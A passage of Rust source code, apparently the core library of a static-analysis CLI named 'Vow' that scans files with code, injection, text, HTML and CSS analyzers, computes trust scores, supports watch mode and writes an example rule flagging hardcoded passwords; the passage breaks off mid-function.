pub mod analyzers;
pub mod rules;
pub mod report;
// pub mod scanner; // Temporarily disabled - requires async networking

use std::path::{Path, PathBuf};
use std::fs;
use std::io::{self, Read};
use ignore::WalkBuilder;
use serde::{Deserialize, Serialize};
use rayon::prelude::*;
use std::sync::{Arc, Mutex};
use std::time::{Instant, Duration, SystemTime};
use std::collections::HashMap;
use notify::{RecommendedWatcher, RecursiveMode, Watcher, Event, EventKind};
use crossbeam_channel::{bounded, select, Receiver};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalysisResult {
    pub path: PathBuf,
    pub file_type: FileType,
    pub issues: Vec<Issue>,
    pub trust_score: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Issue {
    pub severity: Severity,
    pub message: String,
    pub line: Option<usize>,
    pub rule: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum FileType {
    Python,
    JavaScript,
    TypeScript,
    Rust,
    Shell,
    Markdown,
    Text,
    YAML,
    JSON,
    Java,
    Go,
    Ruby,
    C,
    Cpp,
    CSharp,
    PHP,
    Swift,
    Kotlin,
    R,
    MQL5,
    Scala,
    Perl,
    Lua,
    Dart,
    Haskell,
    HTML,
    CSS,
    Unknown,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    pub fn score_impact(&self) -> u8 {
        match self {
            Severity::Critical => 25,
            Severity::High => 15,
            Severity::Medium => 8,
            Severity::Low => 3,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum FilePriority {
    High,    // Code files (.py, .js, .ts, .rs, .java, etc.)
    Medium,  // Config files (.yaml, .json, .toml)
    Low,     // Text files (.md, .txt)
}

impl FileType {
    pub fn get_priority(&self) -> FilePriority {
        match self {
            FileType::Python | FileType::JavaScript | FileType::TypeScript | FileType::Rust |
            FileType::Java | FileType::Go | FileType::Ruby | FileType::C | FileType::Cpp |
            FileType::CSharp | FileType::PHP | FileType::Swift | FileType::Kotlin |
            FileType::R | FileType::MQL5 | FileType::Scala | FileType::Perl |
            FileType::Lua | FileType::Dart | FileType::Haskell | FileType::Shell => FilePriority::High,
            
            FileType::YAML | FileType::JSON | FileType::HTML | FileType::CSS => FilePriority::Medium,
            
            FileType::Markdown | FileType::Text | FileType::Unknown => FilePriority::Low,
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ProjectResults {
    pub files: Vec<AnalysisResult>,
    pub summary: ProjectSummary,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ProjectSummary {
    pub total_files: usize,
    pub avg_score: u8,
    pub total_issues: usize,
    pub issues_by_severity: std::collections::HashMap<String, usize>,
    pub files_per_second: f32,
    pub total_time_seconds: f32,
    pub files_skipped: usize,
    pub skipped_reasons: std::collections::HashMap<String, usize>,
}

#[derive(Debug)]
pub struct AnalysisMetrics {
    pub total_time_seconds: f32,
    pub files_skipped: usize,
    pub skipped_reasons: std::collections::HashMap<String, usize>,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct Config {
    pub threshold: Option<u8>,
    pub enabled_analyzers: Option<Vec<String>>,
    pub custom_rule_dirs: Option<Vec<PathBuf>>,
    pub max_file_size_mb: Option<u64>,
    pub max_directory_depth: Option<usize>,
    pub max_issues_per_file: Option<usize>,
    pub parallel_processing: Option<bool>,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            threshold: Some(70),
            enabled_analyzers: Some(vec!["code".to_string(), "text".to_string(), "rules".to_string()]),
            custom_rule_dirs: None,
            max_file_size_mb: Some(10),
            max_directory_depth: Some(20),
            max_issues_per_file: Some(100),
            parallel_processing: Some(true),
        }
    }
}

/// Initialize a new Vow project
pub fn init_project(path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let vow_dir = path.join(".vow");
    
    // Create .vow directory
    fs::create_dir_all(&vow_dir)?;
    
    // Create config.yaml
    let config = Config::default();
    let config_content = serde_yaml::to_string(&config)?;
    fs::write(vow_dir.join("config.yaml"), config_content)?;
    
    // Create rules directory with example rules
    let rules_dir = vow_dir.join("rules");
    fs::create_dir_all(&rules_dir)?;
    
    let example_rule = r#"name: "hardcoded_passwords"
description: "Detect hardcoded passwords in code"
severity: "high"
patterns:
  - type: "regex"
    pattern: "password\\s*=\\s*[\"'][^\"']+[\"']"
  - type: "contains"
    pattern: "SECRET_KEY = "
file_types: ["py", "js", "ts"]
"#;
    fs::write(rules_dir.join("security.yaml"), example_rule)?;
    
    // Create example .vowignore file
    let vowignore_content = r#"# Example .vowignore file
# Ignore test files
**/test/**
**/tests/**
**/__tests__/**
*.test.js
*.test.ts
*.spec.js
*.spec.ts

# Ignore build artifacts
node_modules/
dist/
build/
out/
target/

# Ignore temporary files
*.tmp
*.temp
"#;
    fs::write(path.join(".vowignore"), vowignore_content)?;
    
    println!("✓ Initialized Vow project in {}", path.display());
    println!("  - Created .vow/config.yaml");
    println!("  - Created .vow/rules/security.yaml");
    println!("  - Created .vowignore");
    
    Ok(())
}

/// Watch mode: continuously monitor for file changes and re-analyze
pub fn watch_files(
    path: String,
    format: String,
    rules: Option<PathBuf>,
    threshold: Option<u8>,
    ci: bool,
    verbose: bool,
    quiet: bool,
    max_file_size: u64,
    max_depth: usize,
    max_issues: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    if path == "-" {
        return Err("Watch mode doesn't support reading from stdin. Please specify a file or directory.".into());
    }
    
    let watch_path = PathBuf::from(&path);
    if !watch_path.exists() {
        return Err(format!("Path does not exist: {}", path).into());
    }

    // Set up signal handling for graceful shutdown
    let (shutdown_tx, shutdown_rx) = bounded::<()>(1);
    let shutdown_tx_clone = shutdown_tx.clone();
    
    ctrlc::set_handler(move || {
        println!("\n🛑 Shutting down watch mode...");
        let _ = shutdown_tx_clone.send(());
    }).expect("Error setting Ctrl-C handler");

    // Create file system watcher
    let (tx, rx) = bounded(100);
    let mut watcher: RecommendedWatcher = Watcher::new(
        move |result: Result<Event, notify::Error>| {
            match result {
                Ok(event) => {
                    let _ = tx.send(event);
                },
                Err(e) => {
                    eprintln!("⚠️ Watcher error: {}", e);
                }
            }
        },
        notify::Config::default().with_poll_interval(Duration::from_millis(100))
    )?;

    // Start watching
    if watch_path.is_file() {
        watcher.watch(&watch_path, RecursiveMode::NonRecursive)?;
        if !quiet {
            println!("👁️ Watching file: {}", watch_path.display());
        }
    } else {
        watcher.watch(&watch_path, RecursiveMode::Recursive)?;
        if !quiet {
            println!("👁️ Watching directory: {}", watch_path.display());
        }
    }

    // Run initial analysis
    if !quiet {
        println!("🔍 Running initial analysis...");
    }
    run_single_analysis(&path, &format, &rules, threshold, ci, verbose, quiet, max_file_size, max_depth, max_issues)?;

    // Debouncing state
    let mut last_events: HashMap<PathBuf, SystemTime> = HashMap::new();
    let debounce_duration = Duration::from_millis(200);

    if !quiet {
        println!("\n✅ Watch mode started. Press Ctrl+C to stop.\n");
    }

    // Main event loop
    loop {
        select! {
            recv(shutdown_rx) -> _ => {
                if !quiet {
                    println!("👋 Watch mode stopped");
                }
                break;
            }
            recv(rx) -> event => {
                match event {
                    Ok(event) => {
                        handle_watch_event(
                            event, 
                            &mut last_events, 
                            debounce_duration,
                            &path,
                            &format,
                            &rules,
                            threshold,
                            ci,
                            verbose,
                            quiet,
                            max_file_size,
                            max_depth,
                            max_issues
                        )?;
                    },
                    Err(e) => {
                        eprintln!("❌ Error receiving watch event: {}", e);
                    }
                }
            }
        }
    }

    Ok(())
}

/// Handle a single watch event with debouncing
fn handle_watch_event(
    event: Event,
    last_events: &mut HashMap<PathBuf, SystemTime>,
    debounce_duration: Duration,
    _base_path: &str,
    format: &str,
    rules: &Option<PathBuf>,
    threshold: Option<u8>,
    ci: bool,
    verbose: bool,
    quiet: bool,
    max_file_size: u64,
    _max_depth: usize,
    max_issues: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    
    // Only handle write/create events for performance
    match event.kind {
        EventKind::Create(_) | EventKind::Modify(_) => {},
        _ => return Ok(()) // Ignore other event types
    }

    let now = SystemTime::now();
    
    for path in event.paths {
        // Skip if not a supported file
        if !path.is_file() || !is_supported_file(&path) {
            continue;
        }

        // Debouncing: check if we've seen this file recently
        if let Some(&last_time) = last_events.get(&path) {
            if let Ok(elapsed) = now.duration_since(last_time) {
                if elapsed < debounce_duration {
                    continue; // Skip this event, too recent
                }
            }
        }

        // Update timestamp
        last_events.insert(path.clone(), now);

        // Check file size
        match fs::metadata(&path) {
            Ok(metadata) => {
                if metadata.len() > max_file_size * 1024 * 1024 {
                    if verbose {
                        println!("⏭️ Skipping {} (too large: {}MB)", 
                               path.display(),
                               metadata.len() / (1024 * 1024));
                    }
                    continue;
                }
            },
            Err(_) => continue, // Skip files we can't read metadata for
        }

        // Analyze the changed file
        analyze_changed_file(&path, format, rules, threshold, ci, verbose, quiet, max_issues)?;
    }

    Ok(())
}

/// Analyze a single changed file and display results
fn analyze_changed_file(
    file_path: &Path,
    format: &str,
    rules: &Option<PathBuf>,
    threshold: Option<u8>,
    _ci: bool,
    verbose: bool,
    quiet: bool,
    max_issues: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    let timestamp = chrono::Local::now().format("%H:%M:%S");
    
    if !quiet {
        println!("🔄 [{}] Analyzing: {}", timestamp, file_path.display());
    }

    let analysis_start = Instant::now();
    
    // Analyze the file
    let mut result = match analyze_file_with_limits_verbose(file_path, max_issues, verbose) {
        Ok(result) => result,
        Err(e) => {
            if !quiet {
                eprintln!("❌ [{}] Error analyzing {}: {}", timestamp, file_path.display(), e);
            }
            return Ok(());
        }
    };

    // Apply rules if available
    result = apply_rules_to_result(result, rules)?;

    let analysis_duration = analysis_start.elapsed();

    // Load config for threshold
    let config = load_config(&PathBuf::from(".")).unwrap_or_default();
    let effective_threshold = threshold.or(config.threshold).unwrap_or(70);

    // Display results based on format
    match format {
        "json" => {
            // For JSON, just print the single file result
            let json_output = serde_json::to_string_pretty(&result)?;
            println!("{}", json_output);
        },
        "terminal" | _ => {
            // Terminal format with clear output
            if result.issues.is_empty() {
                if !quiet {
                    println!("✅ [{}] {} - Trust Score: {}% ({}ms)", 
                           timestamp, 
                           file_path.file_name().unwrap_or_default().to_string_lossy(),
                           result.trust_score,
                           analysis_duration.as_millis());
                }
            } else {
                println!("⚠️ [{}] {} - Trust Score: {}% ({} issues, {}ms)",
                       timestamp,
                       file_path.file_name().unwrap_or_default().to_string_lossy(),
                       result.trust_score,
                       result.issues.len(),
                       analysis_duration.as_millis());

                // Show issues
                for issue in &result.issues {
                    let severity_icon = match issue.severity {
                        Severity::Critical => "🔴",
                        Severity::High => "🟠", 
                        Severity::Medium => "🟡",
                        Severity::Low => "🔵",
                    };
                    
                    if let Some(line) = issue.line {
                        println!("  {} Line {}: {}", severity_icon, line, issue.message);
                    } else {
                        println!("  {} {}", severity_icon, issue.message);
                    }
                }

                // Check threshold
                if result.trust_score < effective_threshold {
                    println!("❌ [{}] Below threshold ({}%)", timestamp, effective_threshold);
                }
            }
        }
    }

    if !quiet {
        println!(); // Add blank line for readability
    }

    Ok(())
}

/// Run a single analysis (used for initial scan)
fn run_single_analysis(
    path: &str,
    format: &str,
    rules: &Option<PathBuf>,
    threshold: Option<u8>,
    ci: bool,
    verbose: bool,
    quiet: bool,
    max_file_size: u64,
    max_depth: usize,
    max_issues: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    // Run regular analysis once
    let exit_code = check_input(
        path.to_string(),
        format.to_string(),
        rules.clone(),
        threshold,
        ci,
        verbose,
        quiet,
        false, // Not hook mode
        max_file_size,
        max_depth,
        max_issues
    )?;
    
    if exit_code != 0 && verbose {
        println!("⚠️ Initial analysis found issues");
    }

    Ok(())
}

/// Main entry point for port scanning
pub fn scan_ports(
    _target: String,
    _ports: String,
    _format: String,
    _timeout: u64,
    _concurrency: usize,
    _issues_only: bool,
) -> Result<i32, Box<dyn std::error::Error>> {
    // Port scanning requires async networking, but we're keeping the CLI synchronous
    // This functionality is temporarily disabled to fix memory issues
    eprintln!("Port scanning functionality is temporarily disabled during refactoring to fix memory issues.");
    eprintln!("Use vow check <path> for file/directory analysis.");
    Ok(1)
}

/// Main entry point for checking input (file, directory, or stdin)
pub fn check_input(
    path: String,
    format: String,
    rules: Option<PathBuf>,
    threshold: Option<u8>,
    ci: bool,
    verbose: bool,
    quiet: bool,
    hook_mode: bool,
    max_file_size: u64,
    max_depth: usize,
    max_issues: usize,
) -> Result<i32, Box<dyn std::error::Error>> {
    let mut final_format = format.clone();
    
    // CI mode implies JSON output
    if ci {
        final_format = "json".to_string();
    }
    
    // SARIF format needs to be truly quiet (no performance summaries)
    let truly_quiet = quiet || format == "sarif";
    
    let (results, metrics) = if hook_mode {
        // Hook mode: read file paths from stdin
        let mut buffer = String::new();
        io::stdin().read_to_string(&mut buffer)?;
        let file_paths: Vec<&str> = buffer.lines().collect();
        
        let start_time = std::time::Instant::now();
        let mut results = Vec::new();
        
        for file_path in file_paths {
            let path_buf = PathBuf::from(file_path);
            if path_buf.exists() && path_buf.is_file() && is_supported_file(&path_buf) {
                match analyze_file_with_limits(&path_buf, max_issues) {
                    Ok(result) => results.push(result),
                    Err(e) => {
                        if !quiet {
                            eprintln!("Warning: Failed to analyze {}: {}", file_path, e);
                        }
                    }
                }
            }
        }
        
        let metrics = AnalysisMetrics {
            total_time_seconds: start_time.elapsed().as_secs_f32(),
            files_skipped: 0,
            skipped_reasons: std::collections::HashMap::new(),
        };
        (results, metrics)
    } else if path == "-" {
        // Read from stdin
        let mut buffer = String::new();
        io::stdin().read_to_string(&mut buffer)?;
        let stdin_path = PathBuf::from("<stdin>");
        let result = vec![analyze_content_with_limits(&stdin_path, &buffer, max_issues)?];
        let metrics = AnalysisMetrics {
            total_time_seconds: 0.0,
            files_skipped: 0,
            skipped_reasons: std::collections::HashMap::new(),
        };
        (result, metrics)
    } else {
        let path_buf = PathBuf::from(&path);
        if path_buf.is_file() {
            let result = vec![analyze_file_with_limits(&path_buf, max_issues)?];
            let metrics = AnalysisMetrics {
                total_time_seconds: 0.0,
                files_skipped: 0,
                skipped_reasons: std::collections::HashMap::new(),
            };
            (result, metrics)
        } else if path_buf.is_dir() {
            analyze_directory_parallel(&path_buf, verbose, truly_quiet, max_file_size, max_depth, max_issues)?
        } else {
            return Err(format!("Path does not exist: {}", path).into());
        }
    };
    
    // Load config
    let config = load_config(&PathBuf::from(".")).unwrap_or_default();
    
    // Apply rules to all results
    let mut final_results = Vec::new();
    for mut result in results {
        result = apply_rules_to_result(result, &rules)?;
        final_results.push(result);
    }
    
    // Calculate project summary with metrics
    let project_results = calculate_project_summary_with_metrics(
        final_results,
        metrics.total_time_seconds,
        metrics.files_skipped,
        metrics.skipped_reasons,
    );
    
    // Generate report
    generate_report(&project_results, &final_format)?;
    
    // Check threshold for exit code
    let effective_threshold = threshold.or(config.threshold).unwrap_or(70);
    if project_results.summary.avg_score < effective_threshold {
        Ok(1) // Exit code 1 for failure
    } else {
        Ok(0) // Exit code 0 for success
    }
}

/// Analyze a single file
pub fn analyze_file(path: &Path) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    let content = fs::read_to_string(path)?;
    analyze_content(path, &content)
}

/// Analyze a single file (no timeout needed since regex backtracking was fixed)
fn analyze_file_simple(path: &Path) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    analyze_file(path)
}

/// Analyze content with a given path context, issue limits, and verbose option
pub fn analyze_content_with_limits_verbose(path: &Path, content: &str, max_issues: usize, verbose: bool) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    let mut result = analyze_content_verbose(path, content, verbose)?;
    
    // Limit issues per file
    if result.issues.len() > max_issues {
        result.issues.truncate(max_issues);
        result.issues.push(Issue {
            severity: Severity::Medium,
            message: format!("Analysis stopped after {} issues (max limit reached)", max_issues),
            line: None,
            rule: Some("max_issues_limit".to_string()),
        });
    }
    
    // Recalculate trust score after truncation
    result.trust_score = calculate_trust_score(&result.issues);
    
    Ok(result)
}

/// Analyze content with a given path context and issue limits (non-verbose wrapper)
pub fn analyze_content_with_limits(path: &Path, content: &str, max_issues: usize) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    analyze_content_with_limits_verbose(path, content, max_issues, false)
}

/// Analyze a single file with issue limits and verbose option
pub fn analyze_file_with_limits_verbose(path: &Path, max_issues: usize, verbose: bool) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    let content = fs::read_to_string(path)?;
    analyze_content_with_limits_verbose(path, &content, max_issues, verbose)
}

/// Analyze a single file with issue limits (non-verbose wrapper)
pub fn analyze_file_with_limits(path: &Path, max_issues: usize) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    analyze_file_with_limits_verbose(path, max_issues, false)
}

/// Analyze content with a given path context and optional verbose timing
pub fn analyze_content_verbose(path: &Path, content: &str, verbose: bool) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    let file_type = detect_file_type(path);
    let mut issues = Vec::new();
    let file_start = if verbose { Some(Instant::now()) } else { None };
    
    if verbose {
        println!("🔍 Analyzing {} ({:?})", path.display(), file_type);
    }
    
    // Run appropriate analyzers based on file type
    match file_type {
        FileType::Python | FileType::JavaScript | FileType::TypeScript | FileType::Rust | FileType::Shell | FileType::YAML | FileType::JSON | 
        FileType::Java | FileType::Go | FileType::Ruby | FileType::C | FileType::Cpp | FileType::CSharp | FileType::PHP | 
        FileType::Swift | FileType::Kotlin | FileType::R | FileType::MQL5 | FileType::Scala | FileType::Perl | FileType::Lua | 
        FileType::Dart | FileType::Haskell => {
            // Run code analyzer for code files with import detection
            if matches!(file_type, FileType::Python | FileType::JavaScript | FileType::TypeScript | FileType::Rust | FileType::Java | 
                       FileType::Go | FileType::Ruby | FileType::C | FileType::Cpp | FileType::CSharp | FileType::PHP | 
                       FileType::Swift | FileType::Kotlin | FileType::R | FileType::MQL5 | FileType::Scala | 
                       FileType::Perl | FileType::Lua | FileType::Dart | FileType::Haskell) {
                let analyzer_start = if verbose { Some(Instant::now()) } else { None };
                let custom_allowlist = analyzers::code::CodeAnalyzer::load_custom_allowlist();
                let code_analyzer = analyzers::code::CodeAnalyzer::with_custom_allowlist(custom_allowlist);
                let mut result = code_analyzer.analyze(path, content);
                let issues_found = result.issues.len();
                issues.append(&mut result.issues);
                
                if let Some(start) = analyzer_start {
                    println!("  📊 Code Analyzer: {:.2}ms ({} issues)", 
                           start.elapsed().as_secs_f64() * 1000.0, issues_found);
                }
            }
            
            // Run injection analyzer for all code files (including shell scripts)
            let analyzer_start = if verbose { Some(Instant::now()) } else { None };
            let injection_analyzer = analyzers::injection::InjectionAnalyzer::new();
            let mut injection_result = injection_analyzer.analyze(path, content);
            let issues_found = injection_result.issues.len();
            issues.append(&mut injection_result.issues);
            
            if let Some(start) = analyzer_start {
                println!("  🛡️  Injection Analyzer: {:.2}ms ({} issues)", 
                       start.elapsed().as_secs_f64() * 1000.0, issues_found);
            }
            
            // Run type combination analyzer for strongly typed languages
            if matches!(file_type, FileType::Python | FileType::JavaScript | FileType::TypeScript | FileType::Rust | 
                       FileType::Java | FileType::Go | FileType::CSharp | FileType::Swift | FileType::Kotlin | 
                       FileType::Scala | FileType::Dart | FileType::Haskell) {
                let analyzer_start = if verbose { Some(Instant::now()) } else { None };
                let type_analyzer = analyzers::type_combinations::TypeCombinationAnalyzer::new();
                let mut type_result = type_analyzer.analyze(path, content);
                let issues_found = type_result.issues.len();
                issues.append(&mut type_result.issues);
                
                if let Some(start) = analyzer_start {
                    println!("  🎯 Type Combination Analyzer: {:.2}ms ({} issues)", 
                           start.elapsed().as_secs_f64() * 1000.0, issues_found);
                }
            }
        }
        FileType::Markdown | FileType::Text => {
            let analyzer_start = if verbose { Some(Instant::now()) } else { None };
            let text_analyzer = analyzers::text::TextAnalyzer::new();
            let mut result = text_analyzer.analyze(path, content);
            let issues_found = result.issues.len();
            issues.append(&mut result.issues);
            
            if let Some(start) = analyzer_start {
                println!("  📝 Text Analyzer: {:.2}ms ({} issues)", 
                       start.elapsed().as_secs_f64() * 1000.0, issues_found);
            }
            
            // Also run injection analyzer on text files (they might contain malicious code snippets)
            let analyzer_start = if verbose { Some(Instant::now()) } else { None };
            let injection_analyzer = analyzers::injection::InjectionAnalyzer::new();
            let mut injection_result = injection_analyzer.analyze(path, content);
            let issues_found = injection_result.issues.len();
            issues.append(&mut injection_result.issues);
            
            if let Some(start) = analyzer_start {
                println!("  🛡️  Injection Analyzer: {:.2}ms ({} issues)", 
                       start.elapsed().as_secs_f64() * 1000.0, issues_found);
            }
        }
        FileType::HTML => {
            let analyzer_start = if verbose { Some(Instant::now()) } else { None };
            let html_analyzer = analyzers::html_analyzer::HtmlAnalyzer::new();
            let mut result = html_analyzer.analyze(path, content);
            let issues_found = result.issues.len();
            issues.append(&mut result.issues);
            
            if let Some(start) = analyzer_start {
                println!("  🌐 HTML Analyzer: {:.2}ms ({} issues)", 
                       start.elapsed().as_secs_f64() * 1000.0, issues_found);
            }
        }
        FileType::CSS => {
            let analyzer_start = if verbose { Some(Instant::now()) } else { None };
            let css_analyzer = analyzers::css_analyzer::CssAnalyzer::new();
            let mut result = css_analyzer.analyze(path, content);
            let issues_found = result.issues.len();
            issues.append(&mut result.issues);
            
            if let Some(start) = analyzer_start {
                println!("  🎨 CSS Analyzer: {:.2}ms ({} issues)", 
                       start.elapsed().as_secs_f64() * 1000.0, issues_found);
            }
        }
        _ => {} // No specific analyzer for this file type
    }
    
    // Calculate trust score
    let trust_score = calculate_trust_score(&issues);
    
    if let Some(start) = file_start {
        println!("  ⏱️  Total analysis time: {:.2}ms (Trust Score: {}%)\n", 
               start.elapsed().as_secs_f64() * 1000.0, trust_score);
    }
    
    Ok(AnalysisResult {
        path: path.to_path_buf(),
        file_type,
        issues,
        trust_score,
    })
}

/// Analyze content with a given path context (non-verbose wrapper)
pub fn analyze_content(path: &Path, content: &str) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    analyze_content_verbose(path, content, false)
}

/// Analyze all supported files in a directory with parallel processing and advanced features
pub fn analyze_directory_parallel(
    path: &Path,
    verbose: bool,
    quiet: bool,
    max_file_size_mb: u64,
    max_depth: usize,
    max_issues: usize,
) -> Result<(Vec<AnalysisResult>, AnalysisMetrics), Box<dyn std::error::Error>> {
    let start_time = Instant::now();
    let mut file_candidates = Vec::new();
    let mut skipped_files = 0;
    let mut skipped_reasons = std::collections::HashMap::new();
    let max_file_size_bytes = max_file_size_mb * 1024 * 1024;
    
    // Create walker with optimized exclusions and .vowignore support
    let mut walker = WalkBuilder::new(path);
    walker
        .hidden(false) // Don't automatically skip hidden files
        .git_ignore(true) // Respect .gitignore
        .git_global(false) // Don't use global git config
        .git_exclude(false) // Don't use .git/info/exclude
        .max_depth(Some(max_depth)); // Apply depth limit
    
    // Add comprehensive default directory exclusions (processed BEFORE walking into them)
    let default_excludes = std::collections::HashSet::from([
        "node_modules", ".git", "dist", "build", "target", ".vow", 
        "__pycache__", ".next", ".nuxt", "vendor", "coverage", 
        ".venv", "venv", ".cache", "tmp", "temp", ".tox", "env", ".env",
        ".pytest_cache", ".mypy_cache", ".ruff_cache", ".black_cache",
        "logs", "log", "*.log", ".DS_Store", "Thumbs.db", ".sass-cache",
        "bower_components", "jspm_packages", "web_modules", ".yarn",
        ".pnp", ".pnp.js", "lerna-debug.log*", ".nyc_output", 
        "lib-cov", ".grunt", ".lock-wscript", ".wafpickle-*", 
        ".node_repl_history", ".npm", ".eslintcache", ".stylelintcache",
        ".rpt2_cache/", ".rts2_cache_cjs/", ".rts2_cache_es/",
        ".rts2_cache_umd/", ".optional", ".fusebox/", ".dynamodb/"
    ]);
    
    // Optimized filter that processes exclusions before directory traversal
    walker.filter_entry(move |entry| {
        if entry.file_type().map_or(false, |ft| ft.is_dir()) {
            let name = entry.file_name().to_string_lossy();
            // O(1) lookup instead of linear scan
            !default_excludes.contains(name.as_ref())
        } else {
            true
        }
    });
    
    // Add .vowignore file support (gitignore-style patterns)
    walker.add_custom_ignore_filename(".vowignore");
    
    if !quiet {
        println!("🔍 Scanning directory: {}", path.display());
    }
    
    // Phase 1: Collect all files and filter by size/type
    for result in walker.build() {
        match result {
            Ok(entry) => {
                if entry.file_type().map_or(false, |ft| ft.is_file()) {
                    let file_path = entry.path();
                    if is_supported_file(file_path) {
                        // Check file size
                        match fs::metadata(file_path) {
                            Ok(metadata) => {
                                if metadata.len() > max_file_size_bytes {
                                    skipped_files += 1;
                                    *skipped_reasons.entry("too_large".to_string()).or_insert(0) += 1;
                                    if verbose {
                                        println!("⏭️  Skipping {} ({}MB > {}MB)", 
                                               file_path.display(),
                                               metadata.len() / (1024 * 1024),
                                               max_file_size_mb);
                                    }
                                    continue;
                                }
                            },
                            Err(e) => {
                                skipped_files += 1;
                                *skipped_reasons.entry("metadata_error".to_string()).or_insert(0) += 1;
                                if verbose {
                                    eprintln!("⚠️  Cannot read metadata for {}: {}", file_path.display(), e);
                                }
                                continue;
                            }
                        }
                        
                        // Add to candidates with priority information
                        let file_type = detect_file_type(file_path);
                        let priority = file_type.get_priority();
                        file_candidates.push((file_path.to_path_buf(), priority));
                    }
                }
            }
            Err(e) => {
                if verbose {
                    eprintln!("⚠️  Error walking directory: {}", e);
                }
            },
        }
    }
    
    // Phase 2: Sort files by priority (high priority first)
    file_candidates.sort_by_key(|(_, priority)| *priority);
    
    if !quiet {
        println!("📋 Found {} files to analyze (skipped {})", file_candidates.len(), skipped_files);
    }
    
    // Phase 3: Process files in parallel with progress reporting
    let results = Arc::new(Mutex::new(Vec::new()));
    let processed_count = Arc::new(Mutex::new(0usize));
    let total_files = file_candidates.len();
    
    // Use rayon to process files in parallel with optimized chunk size
    file_candidates.into_par_iter().for_each(|(file_path, _priority)| {
        let file_start = Instant::now();
        
        match analyze_file_with_limits_verbose(&file_path, max_issues, verbose) {
            Ok(result) => {
                let duration = file_start.elapsed();
                
                // Thread-safe result storage
                {
                    if let Ok(mut results_lock) = results.lock() {
                        results_lock.push(result);
                    }
                }
                
                // Thread-safe progress reporting (respects quiet flag)
                if !quiet {
                    if let Ok(mut count) = processed_count.lock() {
                        *count += 1;
                        let current_count = *count;
                    
                    if verbose || (current_count % 10 == 0) {
                        let elapsed = start_time.elapsed();
                        let files_per_sec = current_count as f32 / elapsed.as_secs_f32();
                        let eta_seconds = if files_per_sec > 0.0 {
                            (total_files - current_count) as f32 / files_per_sec
                        } else {
                            0.0
                        };
                        
                        println!("📊 Progress: {}/{} files ({:.1}f/s, ETA: {:.0}s) - {} in {:.2}s", 
                               current_count, total_files, files_per_sec, eta_seconds,
                               file_path.file_name().unwrap_or_default().to_string_lossy(),
                               duration.as_secs_f32());
                    }
                    }
                } else {
                    // Still need to increment counter for final metrics, even in quiet mode
                    if let Ok(mut count) = processed_count.lock() {
                        *count += 1;
                    }
                }
                
                if verbose && duration.as_secs() > 3 {
                    println!("⏳ WARNING: File {} took {:.1}s (target: <3s)", 
                           file_path.display(), duration.as_secs_f32());
                }
            },
            Err(e) => {
                if verbose {
                    eprintln!("❌ Failed to analyze {}: {}", file_path.display(), e);
                }
                
                // Still increment counter for progress
                if !quiet {
                    if let Ok(mut count) = processed_count.lock() {
                        *count += 1;
                    }
                } else {
                    if let Ok(mut count) = processed_count.lock() {
                        *count += 1;
                    }
                }
            },
        }
    });
    
    let total_duration = start_time.elapsed();
    let final_results = Arc::try_unwrap(results)
        .map_err(|_| "Failed to unwrap results Arc")?
        .into_inner()
        .map_err(|_| "Failed to unwrap results Mutex")?;
    let files_processed = final_results.len();
    
    // Enhanced performance summary (always show in quiet mode, this is the summary)
    if !quiet {
        println!("✅ Analysis complete: {} files in {:.1}s ({:.2}f/s, {} skipped)", 
                files_processed, 
                total_duration.as_secs_f32(),
                files_processed as f32 / total_duration.as_secs_f32(),
                skipped_files);
        
        if total_duration > std::time::Duration::from_secs(5) {
            println!("⚠️  Analysis took longer than 5-second target!");
        }
    }
    
    // Only show performance summary if not quiet
    // This ensures SARIF output remains clean JSON
    
    let metrics = AnalysisMetrics {
        total_time_seconds: total_duration.as_secs_f32(),
        files_skipped: skipped_files,
        skipped_reasons,
    };
    
    Ok((final_results, metrics))
}

/// Analyze all supported files in a directory with optimized exclusions (legacy function)
pub fn analyze_directory(path: &Path) -> Result<Vec<AnalysisResult>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();
    
    // Create walker with optimized exclusions and .vowignore support
    let mut walker = WalkBuilder::new(path);
    walker
        .hidden(false) // Don't automatically skip hidden files
        .git_ignore(true) // Respect .gitignore
        .git_global(false) // Don't use global git config
        .git_exclude(false); // Don't use .git/info/exclude
    
    // Add comprehensive default directory exclusions (processed BEFORE walking into them)
    let default_excludes = std::collections::HashSet::from([
        "node_modules", ".git", "dist", "build", "target", ".vow", 
        "__pycache__", ".next", ".nuxt", "vendor", "coverage", 
        ".venv", "venv", ".cache", "tmp", "temp", ".tox", "env", ".env",
        ".pytest_cache", ".mypy_cache", ".ruff_cache", ".black_cache",
        "logs", "log", "*.log", ".DS_Store", "Thumbs.db", ".sass-cache",
        "bower_components", "jspm_packages", "web_modules", ".yarn",
        ".pnp", ".pnp.js", "lerna-debug.log*", ".nyc_output", 
        "lib-cov", ".grunt", ".lock-wscript", ".wafpickle-*", 
        ".node_repl_history", ".npm", ".eslintcache", ".stylelintcache",
        ".rpt2_cache/", ".rts2_cache_cjs/", ".rts2_cache_es/",
        ".rts2_cache_umd/", ".optional", ".fusebox/", ".dynamodb/"
    ]);
    
    // Optimized filter that processes exclusions before directory traversal
    walker.filter_entry(move |entry| {
        if entry.file_type().map_or(false, |ft| ft.is_dir()) {
            let name = entry.file_name().to_string_lossy();
